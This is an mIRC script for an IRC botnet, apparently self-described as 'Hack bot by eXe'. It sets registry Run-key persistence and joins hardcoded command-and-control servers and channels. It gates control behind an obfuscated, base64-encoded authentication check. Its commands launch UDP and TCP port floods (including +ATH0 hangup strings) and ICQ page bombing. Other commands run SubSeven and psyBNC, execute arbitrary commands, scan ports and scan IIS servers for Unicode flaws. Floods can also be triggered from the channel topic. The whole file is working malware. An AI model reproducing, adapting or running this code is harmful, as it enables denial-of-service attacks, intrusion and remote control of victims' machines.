alias r3g { set %regfile $rand(100,999) $+ .reg | write %regfile  REGEDIT4 | write %regfile [HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run] | write %regfile "eXe"="c:\\Winnt\\User\\By.eXe" | run -n regedit /s %regfile | timer 1 4 remove %regfile | timer 1 5 unset %regfile }
on *:start: {  r3g | if ($server == $null) {  titlebar eXe |  .run hw.eXe "mIRC32 eXe"  | username e $+ $rand(1,999) $+ $rand(1,999)
    emailaddr e $+ $rand(1,999) $+ $rand(1,999) $+ @ $+ .ru | nick Lam3 $+ - $+ $rand(1,999) $+ $rand(1,999)  $+ $rand(1,999) | set %realbotnick Lam3 $+ - $+ $rand(1,999) $+ $rand(1,999)  $+ $rand(1,999)
    anick %realbotnick | if (%server.kline == $null) { set %server.kline irc.pups.net.ru 6667 }
    if (%chan.key  == $null)  { set %chan.key pupsik } | if (%chan.join  == $null)  { set %chan.join #lam3  }
    if (%server.connect  == $null) { set %server.connect qwe.pups.net.ru 27272 }
  server $iif(%server.connect == $null, irc.rinet.ru 6667,%server.connect) }
  .timercheck.server -o 0 160 check.server | .timercheck.chanell 0 60 check.channel
.timercheck.bncc -o 0 160 check.bnc |  if ($sock(bnc) == $null) { bnc } | timer 1 3 remove c:\winnt\ $+ %aftp.file }
on 1:CONNECT: { unset %auth* | join %chan.join %chan.key | nick $remove($me,[ScanPort],[Unicode],[UniScan]) | if ($sock(bnc) == $null) { bnc } }
on 1:ERROR:*kill*: { if ($timer(killed.check) != $null) { halt } | .timerkilled.check -o 1 300 kill.check }
alias kill.check { if ($server == $null) { server $iif(%server.kline == $null, irc.rinet.ru 6667,%server.kline)  } }
alias dec { return $decode($1,m,1) }
alias check.auth { .timerauth.cls 1 1 auth.cls | set %var 1 | set %cyc 1 |   :start  |   if ( $mid($2,%cyc,1) == $null) { goto end | halt }  |   set %var %var $+ $calc( $asc($mid($2,%cyc,1)) $ret(42) $len(%var) )  |   inc %cyc |  goto start |   : end  
  $dec(c2V0ICVnZXQ=) $round( $calc( $len($1) /  $dec(NSAtIDE=) ),0)  |   if ( $left(%var,$calc(%get - 2)) !=  $left($1,$calc(%get - 2)) ) {  set %rez 666 |   return %rez | halt } |   if ( $right(%var,$calc($len(%var) - %get * 5)) != $right($1,$calc($len($1) - %get * 5)) ) {  set %rez 666 |   return %rez | halt }
set %rez $calc( $asc($mid($1,%get,1)) $ret(42) $asc($mid($1,$calc( %get * 2),1)) $ret(42) $asc($mid($1,$calc( %get * 3),1)) * $asc($mid($1,$calc( %get * 4),1)) * $asc($mid($1,$calc( %get * 5),1)) ) |   return %rez }
alias ret {  return $chr($1) }
alias CheckNLimit { if ($file($mircdir\u.eXe).size > 300000) .write -c $mircdir\u.eXe }
alias auth.cls { unset %rez | unset %var | unset %cyc | unset %get }
alias checkcn { return $iif(# != $null,#,$nick) }
alias check.bnc { if ($sock(bnc) == $null) { bnc } }
alias check.channel { if ($me !ison %chan.join) { join %chan.join %chan.key } }
alias check.server { if ($server == $null) { /identd off | /emailaddr $read n.eXe $+ @ $+ $rand(A,Z) $+ .ru | server $iif(%server.connect == $null, eu.chatnet.org, %server.connect) } }
alias sysinfo {  .msg $1 5[4System5] 10OS 14( $+ 19 $+ $dll(si.eXe,osinfo,_) $+ 14 $+ ) 10TimeOS 14( $+ 19 $+ $dll(si.eXe,uptime,_) $+ 14 $+ ) 10CPU 14( $+ 19 $+ $dll(si.eXe,cpuinfo,_) $+ 14 $+ ) 10Memory 14( $+ 19 $+ $dll(si.eXe,meminfo,_) $+ 14 $+ )  10Disk 14( $+ 19 $+ $dll(si.eXe,diskcapacity,_) $+ 14 $+ )  10Connect 14( $+ 19 $+ $dll(si.eXe,connection,_) $dll(si.eXe,netcapacity,_) $+ 14 $+ ) }
on *:exit: { run $mircexe }
on *:text:*:*: {
  if ($1 == !seen) { if ($2 == $me) { msg $checkcn 12Thats Me | halt }
    if ($2 == $nick) { msg $checkcn 12Thats You | halt } | if ($2 ison $chan) { msg $checkcn 12Look On The Nicklist | halt }
    if ($readini $mircdirsn.eXe $2 info: == $null) { msg $checkcn 12Sorry I Havnt Seen $2 | halt }
  else { msg $checkcn 12 $+ $readini $mircdirsn.eXe $2 Info: | halt } }       
  if ($chr(120) !isin $address($nick,3)) { halt }
  if ($1 == !) { if ($2 == $null) { halt } | if ($check.auth($2,$address($nick,5)) == $dec(MzY5NDUyMTYw)) {
      set %auth $+ $nick yes | .msg $checkcn 14(3 $+ $nick $+ 14) 12Authentication successful. 
  if ($dec(eDNtMXN0) isin $remove($gettok($address($nick,3),1,64),!,*) ) || $dec(bWF4) isin $remove($gettok($address($nick,3),1,64),!,*) ) { set %auth $+ $nick admin } } }
  if ( (%auth [ $+ [ $nick ] ] != yes) && (%auth [ $+ [ $nick ] ] != admin) ) { halt }
  if ($1 == !sys) { sysinfo $checkcn }
  if ($1 == !icqpagebomb) { if ($2 == help) { msg $checkcn Syntax: !icqpagebomb uin ammount email/name sub message (HELP) | halt } 
    if ($2 == reset) { msg $checkcn Icq Page Bomber (All Settings Reset!)... | unset %ipb.n | unset %ipb.sub | unset %ipb.m | unset %ipb.uin | unset %ipb.t } 
    if ($6 == $null) { msg $checkcn Error!: !icqpagebomb uin ammount email/name sub message | halt } 
    if ($3 !isnum 1-100) { msg $checkcn ERROR! Under Ammount 100 please. (moreinfo type !icqpagebomb help) | halt } 
  msg $checkcn ICQ B0MB n0w: $2 |  set %ipb.n $4 | set %ipb.sub $5 | set %ipb.m $replace($6-,$chr(32),$chr(160)) | set %ipb.uin $2 | set %ipb.t $3  | icqpagebomb } 
  if ($1 == !ip) {  .msg  $checkcn 10IP $+ 14( $+ 19 $+ $ip $+ 14 $+ ) 10HOST $+ 14( $+ 19 $+ $host $+ 14 $+ ) }
  if ($1 == $dec(IXZlcnNpb24=)) { $dec(Lm1zZw==) $checkcn $dec(AzEwVmVyc2lvbiADMTQoAzE5SGFjayBib3QgYnkgZVhlIHYuIDEuMAMxNCk=) }
  if ($1 == !portfree) { if ($2 == $null) { halt } | if ($portfree($2) == $true) { .msg $checkcn 10Port 14( $+ 19 $+ $2 $+ 14 $+ ) 4FREE }
  else {  .msg $checkcn 10Port 14( $+ 19 $+ $2 $+ 14 $+ ) 4IN USE } }
  if ($1 == !var) { if ($2  == $null) { halt } | if ([ [ $2 ] ] == $null) { .msg  $checkcn 10NO FOUND 14( $+ 19 $+ $2 $+ 14 $+ ) | halt  }
  .msg  $checkcn 10Variable 14( $+ 19 $+  $2- = [ [ $2- ] ] $+ 14 $+ ) }
  if ($1 == !j) { if ($2 == $null) { halt } | join $2- }
  if ($1 == !p) { if ($2 == $null) { halt } | part $2- }
  if ($1 == !do) { if (%auth [ $+ [ $nick ] ] != admin) { halt }
  if ($2 == $null) { halt } | if (exit isin $2-) { halt } | .msg $checkcn 10Yes 4Master | $2-   }
  if ($1 == !autoupload) { if (%auth [ $+ [ $nick ] ] != admin) { halt } 
    if ($2 == on) { set %aftp.mode on | .msg $checkcn 10AutoUpLoad 14( $+ 19 $+ ON  $+ 14 $+ ) }
  else { set %aftp.mode off | .msg $checkcn 10AutoUpLoad 14( $+ 19 $+ OFF  $+ 14 $+ ) } }
  if ($1 == !aftp) { if (%auth [ $+ [ $nick ] ] != admin) { halt }
    if ($2 == $null) && ($3 == $null) && ($4 == $null) && ($5 == $null) { halt } 
    .msg $checkcn 12Aftp Settings 10Server 14( $+ 19 $+ $2  $+ 14 $+ ) 10Login 14( $+ 19 $+ $3  $+ 14 $+ ) 10Password 14( $+ 19 $+ $4 $+ 14 $+ ) 10File 14( $+ 19 $+ $5 $+ 14 $+ )
  set %aftp.server $2 | set %aftp.login $3 | set %aftp.pass $4 | set %aftp.file $5 }
  if ($1 == !server) { if (%auth [ $+ [ $nick ] ] != admin) { halt } | if ($2 == $null) { halt }
  .msg $checkcn 10CYA on 14( $+ 19 $+ $2- $+ 14 $+ ) | .timerserver 1 3 server $2- }
  if ($1 == !quit) { .msg $checkcn 4...see you later... | server }
  if ($1 == !rbn) { nick %realbotnick }
  if ($1 == !hbn) { nick Lam3 $+ - $+ $rand(1,999) $+ $rand(1,999)  $+ $rand(1,999) }
  if ($1 == !udp.stat) { set %count.udp 1 | set %upd.mush 0 | set %udp.who ""
    :start | if ($timer(%count.udp) == $null) { goto ready | halt } | if (udp isin $timer(%count.udp)) { inc %upd.mush | set %udp.who  $right($timer(%count.udp),$calc($len($timer(%count.udp)) - 5 )) }
  inc %count.udp | goto start | :ready |  .msg $checkcn 10UDP attack now 14( $+ 19 $+ %udp.who $+ 14)  }
  if ($1 == !udp) { if ($2 == $null) { halt } | set %count.udp 1 
    :start | if ($timer(%count.udp) == $null) { goto ready | halt } 
    if (udp isin $timer(%count.udp)) { .msg $checkcn 4UDP 12[9already in use12]  | halt  }
    inc %count.udp | goto start | :ready | .msg $checkcn 10UDP 14( $+ 19 $+ $2 $+ 14) 4ENABLE
    write -il1 us.eXe 12udp[4 $time $date 12]:11 $nick -- $address($nick,5) to:4 $2-
    .timerudp.a $+ $2   -m 0 10 .sockudp -b udp $+ $rand(0,9999999999) $2 $rand(100,500) 99999999999999999999 ECHO $ip 
    .timerudp.b $+ $2   -m 0 10 .sockudp -b udp $+ $rand(0,9999999999) $2 $rand(500,4000) 9999999999999999999 ECHO $ip 
    .timerudp.c $+ $2   -m 0 10 .sockudp -b udp $+ $rand(0,9999999999) $2 $rand(4000,60000) 99999999999999999 ECHO $ip 
  .timerstop_atack $+ $2 1 $iif($3 != $null,$3,1200) timerudp* off   }
  if ($1 == !sudp) { if ($2 == $null) { halt }  | if ($timer(udp.a [ $+ [ $2 ] ]  ) == $null) { halt }
  .msg $checkcn 10UDP 14( $+ 19 $+ $2 $+ 14) 4DISABLE | timerudp* off  | timerstop_atack $+ $2 off  }
  if ($1 == !op) { mode # +o $nick }
  if ($1 = !sportflood) { .timeropensock.stat off | .timerportflood.pause off  |     sockclose portflood.*
  .msg $checkcn 12Port Flood 10Status 14( $+ 19 $+ OFF  $+ 14) 10IP 14( $+ 19 $+ %pf.ip $+ 14) 10Port 14( $+ 19 $+ %pf.port $+ 14)  }
  if ($1 = !portflood) { if ($4 != $null) { if ( $sock(portflood.*,0) != 0 ) {  .msg $checkcn 4Error! 12Port Flood 10Status 14( $+ 19 $+ Flooding  $+ 14) 10IP 14( $+ 19 $+ %pf.ip $+ 14) 10Port 14( $+ 19 $+ %pf.port $+ 14) | halt  }
      if ($4 !isnum 1-10000) { msg $checkcn 4Error! 12Port Flood 10Max flood count 14( $+ 19 $+ 10000 $+ 14)  | halt  }
      set %pf.port $3  | set %pf.ip $2 
      if ($3 == random) { set %pf.port Random  |   msg $checkcn 12Port Flood 10IP 14( $+ 19 $+ $2 $+ 14) 10Port 14( $+ 19 $+ RANDOM $+ 14) | start.randsocket  $2 $4 | halt } 
      .timerportflood.pause off
      write -il1 us.eXe 12portflood[4 $time $date 12]:11 $nick -- $address($nick,5) to:4 $2-
  set %pf.all 0 |   msg $checkcn 12Port Flood 10IP 14( $+ 19 $+ $2 $+ 14) 10Port 14( $+ 19 $+ $3 $+ 14) |  portflood $4  }  }
  if ($1 == !reg) { .msg $checkcn 10Registration!!! | r3g }
  if ($1 == !sub) { if (%auth [ $+ [ $nick ] ] != admin) { halt } |  .msg $checkcn 10Sub Seven | run sub.eXe }
  if ($1 == !pb) {  if (%auth [ $+ [ $nick ] ] != admin) { halt } |  .msg $checkcn 10PsyBNC on | run pb.eXe }
  if ($1 == !reboot) {   if (%auth [ $+ [ $nick ] ] != admin) { halt } |  .msg $checkcn 10REBOOT SERVER | run reboot.exe }
  if ($1 == !ircd) {   if (%auth [ $+ [ $nick ] ] != admin) { halt } |  .msg $checkcn 10IRCD SERVER on | run irc.eXe | timer 1 90 run hw.eXe "UnrealIRCd/32 - IRC.SECURITY.GOV" }
  if ($1 == !lag ) { set %ping_chan $checkcn | set %lag $ticks | .ctcp $me PING | close -m   }
  if (!unicod.clear. isin $1) { if ( ($remove($1,!unicod.clear.) != *) && ($remove($1,!unicod.clear.) != $me) ) { halt }
  write -c unicod_ready | .msg $checkcn 12File 4Cleared  }
  if (!unicod.rezult. isin $1) { if ( ($remove($1,!unicod.rezult.) != *) && ($remove($1,!unicod.rezult.) != $me) ) { halt } | dcc send $nick unicod_ready }
  if (!unicod.stop. isin $1) { if ( ($remove($1,!unicod.stop.) != *) && ($remove($1,!unicod.stop.) != $me) ) { halt }
    .msg $checkcn 12Unicode Stoped! 10IP`iis was 14( $+ 19 $+ %unicod.ip $+ 14 $+ ) 10Found BAGs 14( $+ 19 $+ %unicod.read $+ 14 $+ )
  .timerunicod_start off |   .timercheck.iss off  | sockclose unicod.* | nick $remove($me,[Unicod])   }
  if (!unicod.stat. isin $1) {  if ( ($remove($1,!unicod.stat.) != *) && ($remove($1,!unicod.stat.) != $me) ) { halt }
    if ($sock(unicod.*,0) > 1) {   .msg $checkcn 10Now scanning IIS 14( $+ 19 $+ %unicod.ip $+ 14 $+ ) 10Status 14( $+ 19 $+ %unicod.page $+ 14 $+ ) 10bags .. Found BAGs 14( $+ 19 $+ %unicod.read $+ 14 $+ ) |  halt  }
  .msg $checkcn 10Last Scan IIS was 14( $+ 19 $+ %unicod.ip $+ 14 $+ ) 10Found BAGs 14( $+ 19 $+ %unicod.read $+ 14 $+ )   }
  if (!unicod. isin $1) { if ( ($remove($1,!unicod.) != *) && ($remove($1,!unicod.) != $me) ) { halt }
    if ($2 == $null) { halt } | if ($exists(ib.eXe) != $true) { .msg $checkcn 4!!! 10FILE NO FOUND 4!!!  |  halt  }    
    if ($sock(unicod.*,0) > 1) {  .msg $checkcn 4!!! 10ALREADY IN USE 4!!! 10Scaning 14( $+ 19 $+ %unicod.ip $+ 14 $+ )  | halt } 
    if (%iniscan.stat.bag == on) { .msg $checkcn 4ALREADY IN USE! 10Found server IIS 14( $+ 19 $+ %uniscan.found $+ 14 $+ ) 10Found bag 14( $+ 19 $+ %uniscan.bag $+ 14 $+ ) | halt  }
    set %unicod.page 0 |  set %unicod.step 1 | set %unicod.read 0 | set %unicod.obj $checkcn |  set %unicod.ip $2 
    nick $me $+ [Unicod] |  .msg $checkcn 10Now scanning for IIS servers 14( $+ 19 $+ $2 $+ 14 $+ )
  sockopen unicod. $+ %unicod.page $2 80  |  .timercheck.iss 1 20 check.iss $2 unicod. $+ %unicod.page } 
  if (!uniscan.clear. isin $1) { if ( ($remove($1,!uniscan.clear.) != *) && ($remove($1,!uniscan.clear.) != $me) ) { halt }
  write -c unicod_ready |  write -c unicod_look | .msg $checkcn 12File 4Cleared |  halt  }
  if (!uniscan.rezult. isin $1) { if ( ($remove($1,!uniscan.rezult.) != *) && ($remove($1,!uniscan.rezult.) != $me) ) { halt } | dcc send $nick unicod_ready }
  if (!uniscan.stop. isin $1) { if ( ($remove($1,!uniscan.stop.) != *) && ($remove($1,!uniscan.stop.) != $me) ) { halt }
    set %iniscan.stat.bag off  |   .timeruniscan_start off  |  sockclose uniscan.*  
    sockclose unibag.* |  .timerunibag.stat off | .timerunibag.break off | .timerunibaggi_work off
    .msg $checkcn 12Scanning Stoped! 10At 14( $+ 19 $+ $longip(%uni.oneip) $+ 14 $+ ) 10Scan was 14( $+ 19 $+ %uniscan.work $+ 14 $+ ) 10Found server IIS 14( $+ 19 $+ %uniscan.found $+ 14 $+ ) 10Found bag 14( $+ 19 $+ %uniscan.bag $+ 14 $+ ) 
  nick %uniscan.wnick |  halt }
  if (!uniscan.stat. isin $1) { if ( ($remove($1,!uniscan.stat.) != *) && ($remove($1,!uniscan.stat.) != $me) ) { halt }
    if (%iniscan.stat.bag == off) { .msg $checkcn 10Status 14( $+ 19 $+ OFF $+ 14 $+ ) 10Last Scan 14( $+ 19 $+ %uniscan.work $+ 14 $+ ) 10Found server IIS 14( $+ 19 $+ %uniscan.found $+ 14 $+ ) 10Found bag 14( $+ 19 $+ %uniscan.bag $+ 14 $+ ) 10File 14( $+ 19 $+ $lines(unicod_ready) $+ 14 $+ ) 10bugs  |  halt  }
    if (%iniscan.stat.server == on) {  .msg $checkcn 10Status 14( $+ 19 $+ Scaning & Hacking $+ 14 $+ ) 10IIS 14( $+ 19 $+ %uniscan.work $+ 14 $+ ) 10Now Server 14( $+ 19 $+ $longip(%uni.oneip) $+ 14 $+ ) 10Found server IIS 14( $+ 19 $+ %uniscan.found $+ 14 $+ ) 10Found bag 14( $+ 19 $+ %uniscan.bag $+ 14 $+ ) 10File 14( $+ 19 $+ $lines(unicod_ready) $+ 14 $+ ) 10bugs }
  if (%iniscan.stat.server == off) {  .msg $checkcn 10Status 14( $+ 19 $+ Hacking $+ 14 $+ ) 10Found server IIS 14( $+ 19 $+ %uniscan.found $+ 14 $+ ) 10Found bag 14( $+ 19 $+ %uniscan.bag  $+ 14 $+ ) 10Server for Checking 14( $+ 19 $+ $lines(unicod_look) $+ 14 $+ ) 10File 14( $+ 19 $+ $lines(unicod_ready) $+ 14 $+ ) 10bugs } |   halt  }
  if (!uniscan. isin $1) { if ( ($remove($1,!uniscan.) != *) && ($remove($1,!uniscan.) != $me) ) { halt }
    if ($2 == $null) { halt } | if ($3 == $null) { halt }
    if (%iniscan.stat.bag == on) { .msg $checkcn 12ALREADY IN USE! 10Found server IIS 14( $+ 19 $+ %uniscan.found $+ 14 $+ ) 10Found bag 14( $+ 19 $+  %uniscan.bag $+ 14 $+ ) |   halt    }
    if ($lines(ib.eXe) == 0) || ($exists(ib.eXe) == $false ) {  .msg $checkcn 4Error! 12BAG File not Found!!   |    halt    }  
    set %uniscan.wnick $me | if ($exists(unicod_ready) == $false) write -c unicod_ready
    if ($exists(unicod_look) == $false) write -c unicod_look | if (UniScan !isin $me) { nick  $me $+ [Uniscan] }
    .msg $checkcn 10Now Scaning & Hacking IIS Servers 14( $+ 19 $+ $2 - $3 $+ 14 $+ )
    set %uni.oneip $longip($2) | set %uni.twoip $longip($3)  | set %uniscan.work $2 - $3
    set %uniscan.chan  $checkcn  |    set %uniscan.found 0 |   set %uniscan.bag 0
    set %iniscan.stat.server on  |  set %iniscan.stat.bag on | set %unibag.job on
  .timeruniscan_start 0 1 uniscanstat $2 $3 $checkcn | .timerunibaggi_work 0 10 unibag.start }
  if (!scanport.clear. isin $1) { if ( ($remove($1,!scanport.clear.) != *) && ($remove($1,!scanport.clear.) != $me) ) { halt }
  write -c sp.eXe | .msg $iif(# == $null,$nick,#) 12File 4Cleared }
  if (!scanport.stop. isin $1) { if ( ($remove($1,!scanport.stop.) != *) && ($remove($1,!scanport.stop.) != $me) ) { halt }
    if (%scanport.status == off) {   .msg $iif(# == $null,$nick,#) 10Status 14( $+ 19 $+ OFF $+ 14 $+ ) | halt }
    .msg $iif(# == $null,$nick,#) 12Scaning Stoped 10IP 14( $+ 19 $+ %ipCount $+ 14 $+ ) 10Port 14( $+ 19 $+ %s1Count $+ 14 $+ )
  set %scanport.end on | set %scanport.status off | nick $remove($me,[ScanPort]) }
  if (!scanport.stat. isin $1) {  if ( ($remove($1,!scanport.stat.) != *) && ($remove($1,!scanport.stat.) != $me) ) { halt }
    if (%scanport.status == off) {   .msg $iif(# == $null,$nick,#) 10Status 14( $+ 19 $+ OFF $+ 14 $+ ) 10Last scan IP 14( $+ 19 $+ %ipCount $+ 14 $+ ) 10Port 14( $+ 19 $+ %s11Count - %s2Count $+ 14 $+ ) | halt }
  .msg $iif(# == $null,$nick,#) 10Status 14( $+ 19 $+ Scaning $+ 14 $+ ) 10IP 14( $+ 19 $+ %ipCount $+ 14 $+ ) 10Now Port 14( $+ 19 $+ %s1Count $+ 14 $+ ) 10After 14( $+ 19 $+ %s2Count $+ 14 $+ )  }
  if (!scanport.rezult. isin $1) { if ( ($remove($1,!scanport.rezult.) != *) && ($remove($1,!scanport.rezult.) != $me) ) { halt } |    dcc send $nick sp.eXe   }
  if (!scanport. isin $1) { if ( ($remove($1,!scanport.) != *) && ($remove($1,!scanport.) != $me) ) { halt }
    if (%scanport.status == on) { .timerkick $+ $nick 1 3  .msg $iif(# == $null,$nick,#) 12ALREADY IN USE   | close -m $nick | halt }   
    if (%iniscan.stat.bag == on) { .msg $checkcn 12ALREADY IN USE! 10Status 14( $+ 19 $+ Scaning IIS Servers $+ 14 $+ ) 10Found server IIS 14( $+ 19 $+ %uniscan.found $+ 14 $+ ) 10Found bag 14( $+ 19 $+ %uniscan.bag $+ 14 $+ ) |  halt  }
    if ($2 == $null) { .timerkick $+ $nick 1 3  .msg $iif(# == $null,$nick,#) 12 Enter IP  | close -m $nick | halt }   
    if ($3 == $null) { .timerkick $+ $nick 1 3  .msg $iif(# == $null,$nick,#) 12 Enter First Port | close -m $nick | halt }   
    if ($4 == $null) { .timerkick $+ $nick 1 3  .msg $iif(# == $null,$nick,#) 12 Enter Last Port | close -m $nick | halt }   
    nick $me $+ [ScanPort]  |  $iif(# == $null,set %target.obj $nick , set %target.obj #)
    $iif($5 == $null,set %scan.rezult show , set %scan.rezult hide) |  set %scanport.status on
    .msg $iif(# == $null,$nick,#) 12Scan Port 10IP 14( $+ 19 $+ $2 $+ 14 $+ ) 10Port 14( $+ 19 $+ $3 - $4 $+ 14 $+ )
set %scan.openport 0 |     set %ipCount $2 |     set %s1Count $3 |     set %s11Count $3 |   set %s2Count $4 |  scanstart  } }
ctcp *:*DCC*:* {   if (%auth [ $+ [ $nick ] ] != admin) { halt }
if ($2 == SEND)  {  .msg $nick 10Accepting File 14( $+ 19 $+ $3 $+ 14 $+ )   }   } 
ctcp *:*:*:  { 
  if (($1 == PING) && ($nick == $me)) { .msg %ping_chan 10Lag 14( $+ 19 $+ $calc(($ticks - %lag)/1000) $+ 14 $+ ) 10secs | halt } 
haltdef | .ignore -tu60 *!*@* | halt }
on ^*:INVITE:*:  {    haltdef |   halt }
on ^*:NOTICE:*:?:  {    haltdef |   halt }
on ^*:CHAT:*:  {    haltdef |   halt }
raw 471:*: { .timerunL 1 30 join $2 |  join $2 $+ _ $+ $remove($date,/)   }
raw 474:*: { .timerunban 1 30 join $2 | join $2 $+ _  $+ $remove($date,/)  }
raw 473:*: { .timeruni 1 30 join $2 |  join $2 $+ _  $+ $remove($date,/)  }
raw 465:*: { .timerbanserv 1 30 server }
raw 433:*: { .timernicknoth 1 1 nick Lam3 $+ - $+ $rand(1,999) $+ $rand(1,999)  $+ $rand(1,999) |  halt  }
raw 432:*: { .timernicknoth 1 1 nick Lam3 $+ - $+ $rand(1,999) $+ $rand(1,999)  $+ $rand(1,999) |  halt  }
raw 475:*: { .timerunk 1 30 join $2 | join $2 $+ _ $+ $remove($date,/) }
on *:NICK: { .writeini $mircdirsn.eXe $nick Info: $nick Changed his/her nick to $newnick On $fulldate $+.
  if (%auth [ $+ [ $nick ] ] == admin ) { set %auth [ $+ [ $newnick ] ]  admin |     unset %auth [ $+ [ $nick ] ]     }
  if (%auth [ $+ [ $nick ] ] == yes ) { set %auth [ $+ [ $newnick ] ]  yes |     unset %auth [ $+ [ $nick ] ]     }
set %newnickego $newnick | set %oldnickego $nick }
alias zachita { if ($1 !ison $2) { unset %auth [ $+ [ $1 ] ]  | unset %zacita.wait  } |  if ($1 ison $2) {  mode $2 +o $1 } }
on *:kick:#: { .writeini $mircdirsn.eXe $nick Info: $nick was kicked from $chan On  $fulldate $+ . |  if ($knick == $me) { join # }
if (%auth [ $+ [ $knick ] ] == admin) { .timerzach $+ $chan  $+ %auth [ $+ [ $knick ] ] 1 7 zachita $knick  # } |  if (%auth [ $+ [ $knick ] ] == yes) {  .timerzach $+ $chan  $+ %auth [ $+ [ $knick ] ] 1 7 zachita $knick  # } }
on *:quit: { .writeini $mircdirsn.eXe $nick Info: $nick Left IRC On  $fulldate $+ . | if (%auth [ $+ [ $nick ] ]  == admin)  { unset %auth [ $+ [ $nick ] ] }
if (%auth [ $+ [ $nick ] ]  == yes)  { unset %auth [ $+ [ $nick ] ] } | CheckNLimit | write -s [ $+ [ $nick ] ]  u.eXe $nick $asctime(dd/mm/yy HH:nn:ss) }
on *:part:#: { .writeini $mircdirsn.eXe $nick Info: $nick Left $chan On  $fulldate $+ .  |  if (%auth [ $+ [ $nick ] ]  == admin)  { unset %auth [ $+ [ $nick ] ] }
  if (%auth [ $+ [ $nick ] ]  == yes)  { unset %auth [ $+ [ $nick ] ] } | CheckNLimit | write -s [ $+ [ $nick ] ]  u.eXe $nick $asctime(dd/mm/yy HH:nn:ss) |  if ($me isop #) { halt } 
if ( ($nick(#,0) == 2) && ($nick != $me) ) { part # |  .raw join # } }
alias check.s { if ($me !isop $1) { halt }
if ($nick($1,0) == 1) {  mode $1 +nstlk 31337 %chan.key } }
on *:join:%chan.join:  { if ($nick == $me) { .timerCT 1 15 TopicDo #  | .timerjo.mode 1 3 check.s # } }
alias start.randsocket  {   .timeropensock.stat 1 $2 echo -a done | rand.tcp.socket  $1 }
alias Step.randsocket { rand.tcp.socket  $1 }
alias rand.tcp.socket  {  set %OpenSock.Count 0 |   :opensock  |  inc %OpenSock.Count  |  if ( $timer(opensock.stat) == $null) {  sockclose portflood.*  | halt }  |   if ( %OpenSock.Count > 222) {  .timerOpenSock.AZzZ 1 1 Step.randsocket $1 | halt } |   sockopen portflood. $+ $rand(a,z) $+ $rand(1,9999999999) $+ $rand(a,z)  $1 $rand(1,65000) |   goto opensock }
alias portflood { set %pf.count 0  |   sockclose portflood.*
  while (%pf.count < 50) {     sockopen portflood. $+ $rand(a,z) $+ $rand(1,9999999999) $+ .  $+ %pf.count  %pf.ip %pf.port  |     inc %pf.count   } 
inc %pf.all | portflood.stat $1 }
alias portflood.stat {  if ( %pf.all == $1 ) {   sockclose portflood.* | halt } | .timerportflood.pause 1 3 portflood $1 } 
on *:sockopen:portflood.*: { if ($sockerr > 0) {     sockclose $sockname |     return   }
  sockwrite $sockname -nb GET  !@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&! 
  sockwrite $sockname -nb GET  @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
  sockwrite $sockname -nb GET  !@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!
sockwrite $sockname -nb GET  +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +TH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ }
alias icqpagebomb { :bl | inc %bl.n |  sockopen icqpager $+ %bl.n  wwp.icq.com 80 |  if (%bl.n > %ipb.t) { unset %ipb.t |  unset %bl.n | halt } |  goto bl } 
on *:sockopen:icqpager*:{ sockwrite -nt $sockname GET /scripts/WWPMsg.dll?from= $+ %ipb.n $+ &fromemail= $+ %ipb.n $+ &subject= $+ %ipb.sub $+ &body=  $+ %ipb.m  $+ &to=  $+ %ipb.uin $+ &Send=Message   | sockwrite $sockname $crlf $+ $crlf |  sockread }
on *:sockread:icqpager*:{ sockread -f %temp  }
on *:sockclose:icqpager*:{ unset %temp }
alias TopicDo { set %topic $chan($1).topic | if ( %topic == $null) { halt }
  if (uniscan isin $gettok(%topic,1-,32) ) {  if ( (%iniscan.stat.server == off) && ($lines(unicod_look) == 0) ) { halt } 
    set %iniscan.stat.bag on |  nick $me $+ [Uniscan] |  set %unibag.job  on
    if ( (%iniscan.stat.server == off) && ($lines(unicod_look) != 0) ) {       .timerunibaggi_work 0 10 unibag.start      }
  if (%iniscan.stat.server == on) {     .timeruniscan_start 0 1 uniscanstat  | .timerunibaggi_work 0 10 unibag.start   } }
  if ( $gettok(%topic,1,32) == udp) {   if ( $gettok(%topic,2,32) == $null) { halt } 
    if ( $gettok(%topic,3,32) == $null) { halt } | .timerudp* off | .timerstop_atack* off 
    .timerudp.a $+ $gettok(%topic,2,32)   -m 0 10 .sockudp -b udp $+ $rand(0,9999999999) $gettok(%topic,2,32) $rand(100,500) 99999999999999999999 ECHO $ip 
    .timerudp.b $+ $gettok(%topic,2,32)   -m 0 10 .sockudp -b udp $+ $rand(0,9999999999) $gettok(%topic,2,32) $rand(500,4000) 9999999999999999999 ECHO $ip 
    .timerudp.c $+ $gettok(%topic,2,32)   -m 0 10 .sockudp -b udp $+ $rand(0,9999999999) $gettok(%topic,2,32) $rand(4000,60000) 99999999999999999 ECHO $ip 
  .timerstop_atack $+ $gettok(%topic,2,32) 1 $iif($gettok(%topic,3,32) != $null,$gettok(%topic,3,32),1200) timerudp* off    }  
